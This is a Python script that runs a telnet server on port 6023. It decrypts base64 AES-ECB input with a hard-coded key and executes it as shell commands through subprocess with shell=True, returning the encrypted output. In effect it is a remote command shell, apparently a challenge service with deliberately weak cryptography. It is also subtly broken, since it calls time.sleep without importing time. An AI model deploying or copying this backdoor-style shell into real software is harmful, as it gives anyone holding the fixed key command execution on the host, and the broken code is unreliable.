import asyncio, telnetlib3
import os
import logging
import codecs
import subprocess
import sys
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
import hashlib
import random

SEED = 1234
random.seed(SEED)

def pad(s):
    return s + ('\x00'*(16-(len(s)%16)))

@asyncio.coroutine
def shell(reader, writer):
    #m = hashlib.sha256()
    #m.update(str(random.random()).encode())
    #key = m.digest()[:16]
    cipher = AES.new(key, AES.MODE_ECB)
    cmd = ""
    try: 
        while True:
            inp = yield from reader.read(24)
            if not inp:
                return

            tmp = inp
            inp = b64decode(inp)
            inp = cipher.decrypt(inp).decode()
            print(inp)

            writer.echo(tmp)
            inp = inp.replace('\x00', '')
            cmd += inp
            if cmd == 'exit\n':
                writer.close()
                return
            if '\n' in cmd:
                print(cmd)
                #cmd = cmd.replace('\r', '\n')
                cmd = cmd.strip('\n')
                ret = subprocess.check_output(cmd, shell=True)
                ret = ret.decode('utf-8')
                if len(ret) == 0:
                    ret = 'a'*4
                print(len(pad(ret)))
                sys.stdout.flush()
                ret = b64encode(cipher.encrypt(pad(ret))).decode()
                writer.write(ret)
                print(ret)
                sys.stdout.flush()
                cmd = ""

            yield from writer.drain()

    except Exception as e:
        print(e)
        sys.stdout.flush()
        writer.close()
        return

while True:
    try:
        key = b'Sixteen byte key'
        loop = asyncio.get_event_loop()
        coro = telnetlib3.create_server(port=6023, shell=shell)
        server = loop.run_until_complete(coro)
        loop.run_until_complete(server.wait_closed())
    except (subprocess.CalledProcessError, ConnectionError):
        logging.exception("Exception in main")
        time.sleep(1)

    except Exception as e:
        print(e)
        sys.stdout.flush()
        time.sleep(1)
